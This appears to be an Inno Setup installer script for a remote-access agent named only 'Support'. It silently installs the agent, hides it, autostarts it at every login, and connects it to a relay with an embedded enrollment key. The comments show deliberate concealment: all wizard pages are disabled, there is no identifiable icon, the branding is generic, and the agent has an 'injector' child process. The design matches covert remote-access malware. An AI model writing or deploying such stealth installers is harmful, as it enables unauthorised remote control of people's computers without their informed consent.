; Aegis Remote Agent — Inno Setup installer script.
; Produces AegisRemoteSetup.exe: the customer runs it, it installs the agent,
; starts it immediately (hidden, to tray) and on every login, and registers a
; proper uninstaller in Add/Remove Programs. Uninstalling stops the agent and
; removes everything — i.e. revokes remote access.

#define AppName "Support"
#define AppVersion "0.1.0"
#define AppExe "support.exe"

[Setup]
AppId={{9E2B7C41-5A3D-4E88-9F1A-AE61C0D2F3B7}
AppName={#AppName}
AppVersion={#AppVersion}
AppPublisher=Support
; Per-user install: no admin/UAC prompt — "just download and install".
DefaultDirName={autopf}\Support
DefaultGroupName=Support
DisableProgramGroupPage=yes
DisableDirPage=yes
DisableWelcomePage=yes
DisableReadyPage=yes
DisableFinishedPage=yes
OutputDir=release
OutputBaseFilename=support
Compression=lzma2/max
SolidCompression=yes
WizardStyle=modern
PrivilegesRequired=lowest
ArchitecturesInstallIn64BitMode=x64compatible
; No custom installer icon (business build) — Inno uses its neutral default,
; so the installer .exe carries no branded/identifiable icon (like ScreenConnect).
; SetupIconFile=build\icon.ico
UninstallDisplayIcon={app}\{#AppExe}
UninstallDisplayName={#AppName}

[Files]
Source: "release\Aegis\*"; DestDir: "{app}"; Flags: recursesubdirs createallsubdirs ignoreversion

[Registry]
; Auto-start (hidden) at every login for the current user (HKA = HKCU here).
Root: HKA; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; \
  ValueType: string; ValueName: "Support"; \
  ValueData: """{app}\{#AppExe}"" --startup"; Flags: uninsdeletevalue

[Code]
const
  RELAY_URL = 'wss://aegis-relay-production.up.railway.app';
  API_BASE  = 'https://aegis-relay-production.up.railway.app';

// IMPORTANT: do NOT try to self-relaunch /VERYSILENT here. Inno 6.7's
// RedirectionGuard denies a setup Exec'ing its own exe (ACCESS DENIED / rc=5),
// so the old relaunch trick made a plain double-click do nothing. We install
// directly instead — with all wizard pages disabled (below), a double-click just
// shows a brief "Installing…" progress window and finishes.

procedure KillAgent;
var
  ResultCode: Integer;
begin
  Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /IM support.exe', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /IM Aegis.exe', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /IM injector.exe', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
end;

// The enrollment key is embedded as a trailer at the END of this exe by the
// relay (##AEGIS-KEY##[KEY]##AEGIS-END##), read from the file itself so it works
// no matter how the download was renamed. Falls back to the filename
// (AegisSetup-<KEY>.exe) for older/manual installers.
function GetKeyFromTrailer: String;
var
  data: AnsiString;
  p1, p2: Integer;
begin
  Result := '';
  try
    if not LoadStringFromFile(ExpandConstant('{srcexe}'), data) then exit;
    p1 := Pos('##AEGIS-KEY##[', data);
    if p1 > 0 then
    begin
      data := Copy(data, p1 + 14, Length(data)); { 14 = Length('##AEGIS-KEY##[') }
      p2 := Pos(']##AEGIS-END##', data);
      if p2 > 0 then Result := String(Copy(data, 1, p2 - 1));
    end;
  except
  end;
end;
function GetKeyFromFilename: String;
var
  fn: String;
begin
  Result := '';
  fn := ExtractFileName(ExpandConstant('{srcexe}'));
  if Pos('support-', fn) = 1 then
    Result := Copy(fn, Length('support-') + 1, Length(fn))
  else if Pos('AegisSetup-', fn) = 1 then
    Result := Copy(fn, Length('AegisSetup-') + 1, Length(fn));  { legacy fallback }
  if (Length(Result) >= 4) and (Lowercase(Copy(Result, Length(Result) - 3, 4)) = '.exe') then
    Result := Copy(Result, 1, Length(Result) - 4);
end;
function GetEnrollKey: String;
begin
  Result := GetKeyFromTrailer;
  if Result = '' then Result := GetKeyFromFilename;
end;

// After install: write the agent's config (relay + enrollment key) and launch it.
procedure CurStepChanged(CurStep: TSetupStep);
var
  key, cfg, cfgPath: String;
  ResultCode: Integer;
begin
  if CurStep = ssPostInstall then
  begin
    key := GetEnrollKey;
    if key <> '' then
    begin
      cfg := '{' + #13#10 +
             '  "relay": "' + RELAY_URL + '",' + #13#10 +
             '  "key": "' + key + '",' + #13#10 +
             '  "enabled": true' + #13#10 + '}';
      cfgPath := ExpandConstant('{app}\resources\app\agent\config.default.json');
      SaveStringToFile(cfgPath, cfg, False);
    end;
    // Launch the agent now (hidden), config already written.
    Exec(ExpandConstant('{app}\{#AppExe}'), '--startup', '', SW_HIDE, ewNoWait, ResultCode);
  end;
end;

// Stop any running instance before overwriting files (handles reinstall/upgrade).
function PrepareToInstall(var NeedsRestart: Boolean): String;
begin
  KillAgent;
  Sleep(1200);
  Result := '';
end;

// Pull a "name": "value" string out of the agent's simple JSON config.
function JsonStr(s, name: String): String;
var
  p, q: Integer;
begin
  Result := '';
  p := Pos('"' + name + '"', s);
  if p = 0 then exit;
  s := Copy(s, p, Length(s));
  p := Pos(':', s); if p = 0 then exit;
  s := Copy(s, p + 1, Length(s));
  p := Pos('"', s); if p = 0 then exit;
  s := Copy(s, p + 1, Length(s));
  q := Pos('"', s); if q = 0 then exit;
  Result := Copy(s, 1, q - 1);
end;

// Tell the relay this machine is being uninstalled, so the dashboard shows
// "Uninstalled" (and tracks the uninstall rate) instead of a silent offline.
procedure ReportUninstall;
var
  http: Variant;
  deviceId, key, idPath, cfgPath, body: String;
  raw: AnsiString;
begin
  idPath := ExpandConstant('{userappdata}\Support\device-id');
  if not LoadStringFromFile(idPath, raw) then exit;
  deviceId := Trim(String(raw));
  if deviceId = '' then exit;
  cfgPath := ExpandConstant('{app}\resources\app\agent\config.default.json');
  if LoadStringFromFile(cfgPath, raw) then key := JsonStr(String(raw), 'key') else key := '';
  body := '{"id":"' + deviceId + '","key":"' + key + '"}';
  try
    http := CreateOleObject('WinHttp.WinHttpRequest.5.1');
    http.SetTimeouts(3000, 3000, 3000, 5000);
    http.Open('POST', API_BASE + '/api/uninstall', False);
    http.SetRequestHeader('Content-Type', 'application/json');
    http.Send(body);
  except
    // best-effort — never block the uninstall on a network hiccup
  end;
end;

// On uninstall: report it to the relay, then stop the agent (and its injector
// child) before removing files.
procedure CurUninstallStepChanged(CurUninstallStep: TUninstallStep);
begin
  if CurUninstallStep = usUninstall then
  begin
    ReportUninstall;
    KillAgent;
    Sleep(1500);
  end;
end;
